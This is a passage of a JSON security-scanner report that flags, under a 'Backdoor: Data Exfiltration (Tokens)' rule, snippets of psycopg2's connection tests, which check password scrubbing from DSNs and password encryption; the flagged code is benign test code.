                    "text": "            \"postgres://someone:whateva@localhost/nosuch\")\n\n        self.assertDsnEqual(self.dsn,\n            \"user=someone password=xxx host=localhost dbname=nosuch\")\n\n\nclass SignalTestCase(ConnectingTestCase):\n",
                    "rendered": {
                      "text": "            \"postgres://someone:whateva@localhost/nosuch\")\n\n        self.assertDsnEqual(self.dsn,\n            \"user=someone password=xxx host=localhost dbname=nosuch\")\n\n\nclass SignalTestCase(ConnectingTestCase):\n",
                      "markdown": "`            \"postgres://someone:whateva@localhost/nosuch\")\n\n        self.assertDsnEqual(self.dsn,\n            \"user=someone password=xxx host=localhost dbname=nosuch\")\n\n\nclass SignalTestCase(ConnectingTestCase):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1706,
                  "startColumn": 53,
                  "endLine": 1706,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n    def test_url_leak(self):\n",
                    "rendered": {
                      "text": "    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n    def test_url_leak(self):\n",
                      "markdown": "`    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n    def test_url_leak(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1705,
                  "startColumn": 52,
                  "endLine": 1705,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n",
                    "rendered": {
                      "text": "    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n",
                      "markdown": "`    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n        self.assertRaises(psycopg2.DatabaseError,\n            self.GrassingConnection, \"dbname=nosuch password=whateva\")\n        self.assertDsnEqual(self.dsn, \"dbname=nosuch password=xxx\")\n\n    @skip_before_libpq(9, 2)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1700,
                  "startColumn": 16,
                  "endLine": 1700,
                  "endColumn": 24,
                  "snippet": {
                    "text": "                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n",
                    "rendered": {
                      "text": "                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n",
                      "markdown": "`                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n    def test_leak(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1699,
                  "startColumn": 22,
                  "endLine": 1699,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            finally:\n                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n",
                    "rendered": {
                      "text": "            finally:\n                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n",
                      "markdown": "`            finally:\n                # The connection is not initialized entirely, however the C\n                # code should have set the dsn, and it should have scrubbed\n                # the password away\n                PasswordLeakTestCase.dsn = self.dsn\n\n    @skip_if_crdb(\"connect any db\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1694,
                  "startColumn": 22,
                  "endLine": 1694,
                  "endColumn": 30,
                  "snippet": {
                    "text": "\n        def __init__(self, *args, **kwargs):\n            try:\n                super(PasswordLeakTestCase.GrassingConnection, self).__init__(\n                    *args, **kwargs)\n            finally:\n                # The connection is not initialized entirely, however the C\n",
                    "rendered": {
                      "text": "\n        def __init__(self, *args, **kwargs):\n            try:\n                super(PasswordLeakTestCase.GrassingConnection, self).__init__(\n                    *args, **kwargs)\n            finally:\n                # The connection is not initialized entirely, however the C\n",
                      "markdown": "`\n        def __init__(self, *args, **kwargs):\n            try:\n                super(PasswordLeakTestCase.GrassingConnection, self).__init__(\n                    *args, **kwargs)\n            finally:\n                # The connection is not initialized entirely, however the C\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1683,
                  "startColumn": 8,
                  "endLine": 1683,
                  "endColumn": 16,
                  "snippet": {
                    "text": "class PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n\n    class GrassingConnection(ext.connection):\n        \"\"\"A connection snitching the dsn away.\n",
                    "rendered": {
                      "text": "class PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n\n    class GrassingConnection(ext.connection):\n        \"\"\"A connection snitching the dsn away.\n",
                      "markdown": "`class PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n\n    class GrassingConnection(ext.connection):\n        \"\"\"A connection snitching the dsn away.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1680,
                  "startColumn": 6,
                  "endLine": 1680,
                  "endColumn": 14,
                  "snippet": {
                    "text": "        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n",
                    "rendered": {
                      "text": "        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n",
                      "markdown": "`        self.assertEqual(cur.fetchone()[0], 'on')\n\n\nclass PasswordLeakTestCase(ConnectingTestCase):\n    def setUp(self):\n        super().setUp()\n        PasswordLeakTestCase.dsn = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1579,
                  "startColumn": 13,
                  "endLine": 1579,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\nclass AutocommitTests(ConnectingTestCase):\n",
                    "rendered": {
                      "text": "        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\nclass AutocommitTests(ConnectingTestCase):\n",
                      "markdown": "`        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\nclass AutocommitTests(ConnectingTestCase):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1578,
                  "startColumn": 49,
                  "endLine": 1578,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\n",
                    "rendered": {
                      "text": "            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\n",
                      "markdown": "`            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1576,
                  "startColumn": 49,
                  "endLine": 1576,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n",
                    "rendered": {
                      "text": "            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n",
                      "markdown": "`            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 'user', 'wat', 42)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1574,
                  "startColumn": 49,
                  "endLine": 1574,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n",
                    "rendered": {
                      "text": "        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n",
                      "markdown": "`        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', 'wat', 'abc')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1573,
                  "startColumn": 13,
                  "endLine": 1573,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n",
                    "rendered": {
                      "text": "    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n",
                      "markdown": "`    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1572,
                  "startColumn": 49,
                  "endLine": 1572,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n",
                    "rendered": {
                      "text": "\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n",
                      "markdown": "`\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n            42, 'user', self.conn, 'md5')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1571,
                  "startColumn": 49,
                  "endLine": 1571,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n",
                    "rendered": {
                      "text": "            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n",
                      "markdown": "`            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n        self.assertRaises(TypeError, ext.encrypt_password)\n        self.assertRaises(TypeError, ext.encrypt_password,\n            'password', 42, self.conn, 'md5')\n        self.assertRaises(TypeError, ext.encrypt_password,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1567,
                  "startColumn": 12,
                  "endLine": 1567,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n",
                    "rendered": {
                      "text": "    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n",
                      "markdown": "`    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n    def test_bad_types(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1566,
                  "startColumn": 24,
                  "endLine": 1566,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    @skip_after_libpq(10)\n    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n",
                    "rendered": {
                      "text": "    @skip_after_libpq(10)\n    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n",
                      "markdown": "`    @skip_after_libpq(10)\n    def test_encrypt_scram_pre_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password,\n            password='psycopg2', user='ashesh',\n            scope=self.conn, algorithm='scram-sha-256')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1559,
                  "startColumn": 24,
                  "endLine": 1559,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n        self.assert_(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256')\n            .startswith('SCRAM-SHA-256$'))\n\n",
                    "rendered": {
                      "text": "    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n        self.assert_(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256')\n            .startswith('SCRAM-SHA-256$'))\n\n",
                      "markdown": "`    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n        self.assert_(\n            ext.encrypt_password(\n                'psycopg2', 'ashesh', self.conn, 'scram-sha-256')\n            .startswith('SCRAM-SHA-256$'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1554,
                  "startColumn": 24,
                  "endLine": 1554,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n",
                    "rendered": {
                      "text": "    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n",
                      "markdown": "`    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n        self.assertRaises(psycopg2.NotSupportedError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_before_libpq(10)\n    def test_encrypt_scram(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1549,
                  "startColumn": 24,
                  "endLine": 1549,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    @skip_before_libpq(10)\n    def test_encrypt_bad_libpq_10(self):\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n",
                    "rendered": {
                      "text": "    @skip_before_libpq(10)\n    def test_encrypt_bad_libpq_10(self):\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n",
                      "markdown": "`    @skip_before_libpq(10)\n    def test_encrypt_bad_libpq_10(self):\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    @skip_after_libpq(10)\n    def test_encrypt_bad_before_libpq_10(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1543,
                  "startColumn": 24,
                  "endLine": 1543,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def test_encrypt_md5(self):\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_before_libpq(10)\n",
                    "rendered": {
                      "text": "\n    def test_encrypt_md5(self):\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_before_libpq(10)\n",
                      "markdown": "`\n    def test_encrypt_md5(self):\n        self.assertEqual(\n            ext.encrypt_password('psycopg2', 'ashesh', algorithm='md5'),\n            'md594839d658c28a357126f105b9cb14cfc')\n\n    @skip_before_libpq(10)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_connection.py"
                },
                "region": {
                  "startLine": 1539,
                  "startColumn": 24,
                  "endLine": 1539,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            )[:14], 'SCRAM-SHA-256$')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    def test_encrypt_md5(self):\n        self.assertEqual(\n",
                    "rendered": {
                      "text": "            )[:14], 'SCRAM-SHA-256$')\n\n        self.assertRaises(psycopg2.ProgrammingError,\n            ext.encrypt_password, 'psycopg2', 'ashesh', self.conn, 'abc')\n\n    def test_encrypt_md5(self):\n        self.assertEqual(\n",
